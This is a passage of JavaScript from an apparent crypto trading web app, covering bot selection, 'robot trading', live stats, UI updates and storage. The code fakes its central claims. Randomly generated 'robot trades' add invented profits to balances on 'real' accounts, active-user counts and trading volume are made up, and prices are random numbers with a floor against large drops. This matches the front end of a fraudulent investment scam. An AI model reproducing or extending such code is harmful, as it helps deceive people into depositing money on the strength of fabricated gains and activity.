    if (botKey !== 'none') {
        const bot = appState.availableBots[botKey];
        showToast(`✅ ${bot.icon} ${bot.name} Activated!`, 'success');
    }
}

function closeBotSelection() {
    const modal = document.getElementById('botSelectionModal');
    if (modal) {
        modal.classList.remove('active');
        setTimeout(() => modal.remove(), 300);
    }
}

// ==================== ROBOT TRADING ====================
function simulateRobotTrade() {
    if (appState.selectedBot === 'none' || appState.accountType !== 'real' || appState.displayBalance < 50) {
        return;
    }
    
    const now = Date.now();
    if (now - appState.lastRobotTradeTime < CONFIG.ROBOT_TRADE_INTERVAL) {
        return;
    }
    
    appState.lastRobotTradeTime = now;
    
    const botConfig = appState.availableBots[appState.selectedBot];
    const pairs = Object.keys(cryptoPrices);
    const pair = pairs[Math.floor(Math.random() * pairs.length)];
    const isProfit = Math.random() < botConfig.profitRate;
    
    let profitAmount;
    if (isProfit) {
        profitAmount = botConfig.minProfit + Math.random() * (botConfig.maxProfit - botConfig.minProfit);
    } else {
        profitAmount = -(botConfig.minProfit * 0.3);
    }
    
    const robotTrade = {
        id: 'robot_' + Date.now(),
        pair: pair,
        type: isProfit ? 'BUY' : 'SELL',
        profit: profitAmount,
        timestamp: new Date().toISOString(),
        botName: botConfig.name,
        botIcon: botConfig.icon
    };
    
    appState.displayBalance += profitAmount;
    appState.totalRobotProfits += profitAmount;
    
    appState.robotTrades.unshift(robotTrade);
    if (appState.robotTrades.length > 20) {
        appState.robotTrades = appState.robotTrades.slice(0, 20);
    }
    
    saveState();
    updateUI();
    updateLiveTradingPanel();
    
    showRobotTradeNotification(robotTrade);
}

function showRobotTradeNotification(trade) {
    const notification = document.createElement('div');
    const isProfit = trade.profit > 0;
    
    notification.style.cssText = `
        position: fixed;
        top: 80px;
        right: 20px;
        background: ${isProfit ? 'linear-gradient(135deg, #00ff88 0%, #00cc6a 100%)' : 'linear-gradient(135deg, #ff006e 0%, #cc0055 100%)'};
        color: ${isProfit ? '#000' : '#fff'};
        padding: 16px 20px;
        border-radius: 12px;
        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
        z-index: 9999;
        font-weight: bold;
        animation: slideInRight 0.3s ease-out;
        max-width: 300px;
    `;
    
    notification.innerHTML = `
        <div style="display: flex; align-items: center; gap: 12px;">
            <div style="font-size: 24px;">${trade.botIcon}</div>
            <div>
                <div style="font-size: 14px; margin-bottom: 4px;">${trade.botName}</div>
                <div style="font-size: 12px; opacity: 0.8;">${trade.pair} • ${isProfit ? '+' : ''}$${trade.profit.toFixed(2)}</div>
            </div>
        </div>
    `;
    
    document.body.appendChild(notification);
    
    setTimeout(() => {
        notification.style.animation = 'slideOutRight 0.3s ease-out';
        setTimeout(() => notification.remove(), 300);
    }, 4000);
}

// ==================== LIVE UPDATES ====================
function startLiveUpdates() {
    setInterval(updatePrices, 2000);
    setInterval(updateLiveStats, CONFIG.STATS_UPDATE_INTERVAL);
    
    if (CONFIG.ENABLE_TRADING_ROBOTS) {
        setInterval(simulateRobotTrade, CONFIG.ROBOT_TRADE_INTERVAL);
    }
}

function updateLiveStats() {
    const userChange = Math.floor(Math.random() * 21) - 10;
    appState.activeUsers = Math.max(100, CONFIG.ACTIVE_USERS_BASE + userChange);
    
    const volumeChange = (Math.random() - 0.5) * 5;
    appState.volume24h = Math.max(50, CONFIG.VOLUME_BASE + volumeChange);
    
    const usersEl = document.querySelector('.live-stats .stat:nth-child(1) .stat-value');
    const volumeEl = document.querySelector('.live-stats .stat:nth-child(2) .stat-value');
    
    if (usersEl) usersEl.textContent = appState.activeUsers.toLocaleString();
    if (volumeEl) volumeEl.textContent = '$' + appState.volume24h.toFixed(1) + 'M';
}

function updatePrices() {
    Object.keys(cryptoPrices).forEach(pair => {
        const oldPrice = cryptoPrices[pair];
        const volatility = 20;
        const change = (Math.random() - 0.5) * volatility;
        cryptoPrices[pair] = Math.max(oldPrice + change, oldPrice * 0.95);
        priceChanges[pair] = ((cryptoPrices[pair] - oldPrice) / oldPrice) * 100;
        
        const pairKey = pair.split('/')[0].toLowerCase();
        const priceEl = document.getElementById(pairKey + 'Price');
        const changeEl = document.getElementById(pairKey + 'Change');
        
        if (priceEl) {
            const decimals = cryptoPrices[pair] < 1 ? 4 : 2;
            priceEl.textContent = '$' + cryptoPrices[pair].toFixed(decimals);
        }
        if (changeEl) {
            changeEl.textContent = (priceChanges[pair] >= 0 ? '+' : '') + priceChanges[pair].toFixed(2) + '%';
            changeEl.className = 'asset-change ' + (priceChanges[pair] >= 0 ? 'positive' : 'negative');
        }
    });
}

// ==================== UI FUNCTIONS ====================
function updateUI() {
    const displayedBalance = appState.isAdmin
        ? appState.adminWallet
        : (appState.accountType === 'demo' ? appState.demoBalance : appState.displayBalance);
    
    const balanceEl = document.getElementById('totalBalance');
    if (balanceEl) {
        balanceEl.textContent = '$' + displayedBalance.toFixed(2);
        if (appState.isAdmin) {
            balanceEl.style.color = '#ffd700';
        }
    }
    
    const usdtEl = document.getElementById('usdtAmount');
    if (usdtEl) usdtEl.textContent = displayedBalance.toFixed(2) + ' USDT';
    
    const usdtValueEl = document.getElementById('usdtValue');
    if (usdtValueEl) usdtValueEl.textContent = '$' + displayedBalance.toFixed(2);
    
    updateBotStatus();
}

function updateBotStatus() {
    let statusEl = document.getElementById('botStatus');
    
    if (!statusEl) {
        statusEl = document.createElement('div');
        statusEl.id = 'botStatus';
        statusEl.style.cssText = `
            position: fixed;
            bottom: 20px;
            left: 20px;
            background: rgba(20, 35, 60, 0.95);
            border: 2px solid #a855f7;
            border-radius: 12px;
            padding: 12px 16px;
            z-index: 999;
            box-shadow: 0 4px 20px rgba(168, 85, 247, 0.3);
        `;
        document.body.appendChild(statusEl);
    }
    
    if (appState.selectedBot === 'none') {
        statusEl.style.display = 'none';
    } else {
        statusEl.style.display = 'block';
        const bot = appState.availableBots[appState.selectedBot];
        statusEl.innerHTML = `
            <div style="display: flex; align-items: center; gap: 10px;">
                <div style="font-size: 20px;">${bot.icon}</div>
                <div>
                    <div style="font-size: 12px; font-weight: 700; color: #a855f7;">${bot.name}</div>
                    <div style="font-size: 10px; color: rgba(255,255,255,0.6);">
                        🟢 Active • ${(bot.profitRate * 100).toFixed(0)}% Win
                    </div>
                </div>
            </div>
        `;
    }
}

function switchAccount(type) {
    appState.accountType = type;
    
    const demoBtn = document.getElementById('demoBtn');
    const realBtn = document.getElementById('realBtn');
    
    if (demoBtn) demoBtn.classList.toggle('active', type === 'demo');
    if (realBtn) realBtn.classList.toggle('active', type === 'real');
    
    saveState();
    updateUI();
}

// ==================== STORAGE ====================
function loadState() {
    const saved = localStorage.getItem('cryptoProActiveApp');
    if (saved) {
        try {
            appState = { ...appState, ...JSON.parse(saved), isAdmin: false };
        } catch (e) {
            console.error('Load error:', e);
        }
    }
}

function saveState() {
    const toSave = { ...appState };
    delete toSave.isAdmin;
    localStorage.setItem('cryptoProActiveApp', JSON.stringify(toSave));
}

// ==================== CSS ====================
const style = document.createElement('style');
style.textContent = `
    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
    @keyframes fadeOut { from { opacity: 1; } to { opacity: 0; } }
    @keyframes bounceIn {
        0% { transform: scale(0.3); opacity: 0; }
        50% { transform: scale(1.05); }
        70% { transform: scale(0.9); }
        100% { transform: scale(1); opacity: 1; }
    }
    @keyframes slideInRight {
        from { transform: translateX(400px); opacity: 0; }
        to { transform: translateX(0); opacity: 1; }
    }
    @keyframes slideOutRight {
        from { transform: translateX(0); opacity: 1; }
        to { transform: translateX(400px); opacity: 0; }
    }
    @keyframes slideInUp {
        from { transform: translateY(100px); opacity: 0; }
        to { transform: translateY(0); opacity: 1; }
    }
    @keyframes pulse {
        0%, 100% { opacity: 1; }
        50% { opacity: 0.5; }
    }
    .loading-dots .dot {
        width: 10px;
        height: 10px;
        background: #00d9ff;
        border-radius: 50%;
        animation: pulse 1.4s infinite;
    }
    .loading-dots .dot:nth-child(2) { animation-delay: 0.2s; }
    .loading-dots .dot:nth-child(3) { animation-delay: 0.4s; }
    .admin-stats {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
        gap: 12px;
    }
    .stat-card {
        background: rgba(255,255,255,0.05);
        padding: 16px;
        border-radius: 8px;
        text-align: center;
    }
    .stat-label {
        font-size: 12px;
        opacity: 0.7;
        margin-bottom: 8px;
    }
    .stat-value {
        font-size: 20px;
        font-weight: bold;
        color: #00ff88;
    }
    #liveTradingPanel::-webkit-scrollbar {
        width: 6px;
    }
    #liveTradingPanel::-webkit-scrollbar-track {
        background: rgba(0, 0, 0, 0.2);
        border-radius: 3px;
    }
    #liveTradingPanel::-webkit-scrollbar-thumb {
        background: rgba(0, 217, 255, 0.5);
        border-radius: 3px;
    }
`;
document.head.appendChild(style);
